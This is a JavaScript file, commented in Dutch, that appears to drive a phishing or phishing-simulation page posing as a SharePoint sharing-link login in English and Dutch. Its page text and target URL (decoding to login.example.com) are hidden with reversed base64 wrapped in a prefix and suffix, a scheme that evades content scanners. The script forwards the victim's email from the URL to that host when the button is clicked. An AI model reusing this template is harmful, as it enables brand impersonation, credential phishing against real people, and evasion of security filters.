/////////////////////////////////
// PAS DIT AAN
// copy object uit console output van dev.js
var translations = { // Modifiy
    "en": {
        "title": "SCW=42bpRXYklGbhZFIr5WaMByZulmchh2UE",
        "brand_name": "SCW==Adul2bQVmchh2UE",
        "header": "SCW=kHdpRnblRWSgIXdvlFI5ZWayVmVE",
        "file_description_title": "SCW68GdgsmbpxGIlJXdjV2cgEGIkVmdpV2YlJHIlZ3J19WWE",
        "form_message": "SCW==gLvRHIkVmchh2cgMXY3BSblRXagMXaoRHI0FGa0BCduV3bjN2YhBSZoRHIoRXa3Bibpd2bsByb0BSdvlHIkVWZuBCbsdSZ3BCLr5WasBSZyV3YlNHIzlGa0BiblB3bg8GVE",
        "button_label": "SCW=4Wan9GTE",
        "privacy_text": "SCW==gL05WZtVGdhR3cgk3YhZXayBHIylWZoRHIoRXa3BSZj5WYkJ3bjNWYg4Wag42bpRXYtJ3bm5WagQnb192YjFGIyV3b5BSZzVHIvRHISVERM9ESFNUQMBFI39GbsFGI19Weg4Wan9GTgcmbpt2Ypx2YgknQE",
        "privacy_link": "SCW=MXZpt2bvNEImASejFmdpJHUE"
    },
    "nl": {
        "title": "SCW==gblxWZkBicv9mdgcmbpxWZwB3brBibhZHIllGdhRWasFmVE",
        "brand_name": "SCW==Adul2bQVmchh2UE",
        "header": "SCWuVmcrnmZpJXZ2BCdpVGdpRnblRWSE",
        "file_description_title": "SCW=ojchFmbg4WZn5WY2RnbvByZulGblBHcvtGIlR2ZpxWalZXZiBiblVGI0JWZoBSVE",
        "form_message": "SCW=4ibl5WZw9GIlRHIn5WasVGcw92agUGZnlGbpVmdlJGIlpXZkBSbvBCLkxWZlRWZnBycpBSblRXagQXakBSZl1mchF2dgMXZyRWYslWYt1SZgQXZoBCdl1GIuV2Zn9GbulGI0V2btBSVE",
        "button_label": "SCW=4WZnd2bs5WSE",
        "privacy_text": "SCWucmbpJXYstmclZXejFmdpJHcg4WdoBCdl1GIn5Wat1WZ0NnblVmclZ3bg4Wag4WZrlWdyJWZnBSZ0BycuVmdldWZnRnb192YjFGIlpGIt9GIn5Wat1WZ0NXZvRHISVERM9ESFNUQMBFI1BCdmVWZnBCLuV2arlGbrBSZ0Bibld2ZvxmbJBCcvBicv9GRE",
        "privacy_link": "SCWzVWar92bjBiblBSejFmdpJHUE"
    }
};

// pak de BASE_URL in de console output van dev.js
const BASE_URL = "SCW==QbvNmLlxGctFGel5ibpd2bs9yL6MHc0RHaE"; // Modifiy

/////////////////////////////////

const PREFIX = "SCW";
const SUFFIX = "E";

function dbfst(str) {
  let withoutPrefixSuffix = str.slice(PREFIX.length, -SUFFIX.length);
  let reversed = withoutPrefixSuffix.split("").reverse().join("");
  try {
    return atob(reversed);
  } catch (err) {
    return str;
  }
}

function obfst(str) {
  let encoded = btoa(str);
  let reversed = encoded.split("").reverse().join("");
  return PREFIX + reversed + SUFFIX;
}

function initializePage() {
  const baseUrl = dbfst(BASE_URL);
  const params = new URLSearchParams(window.location.search);
  const encodedEmail = params.get("e");
  const redirectUrl = encodedEmail
    ? baseUrl + "?e=" + encodeURIComponent(encodedEmail) + "&a=sharepoint-click"
    : baseUrl + "?a=sharepoint-click";

  const loginBtn = document.getElementById("login-btn");
  if (!loginBtn) {
    // continue
  } else {
    loginBtn.addEventListener("click", () => {
      window.location.href = redirectUrl;
    });
  }

  const ms_labels = document.getElementsByClassName("ms-label");

  if (ms_labels && ms_labels.length) {
    for (const labelEl of ms_labels) {
      labelEl.textContent = dbfst(labelEl.textContent);
    }
  }
}

function applyLanguage(lang) {
  var activeLang = translations[lang] ? lang : "en";
  var dictionary = translations[activeLang];
  var nodes = document.querySelectorAll("[data-i18n]");

  document.documentElement.lang = activeLang === "nl" ? "nl" : "en-us";
  document.title = dbfst(dictionary.title);

  nodes.forEach(function (node) {
    var key = node.getAttribute("data-i18n");
    if (dictionary[key]) {
      node.textContent = dbfst(dictionary[key]);
    }
  });
}

var browserLanguage =
  navigator.language && navigator.language.toLowerCase().indexOf("nl") === 0
    ? "nl"
    : "en";
  
applyLanguage(browserLanguage);
initializePage();
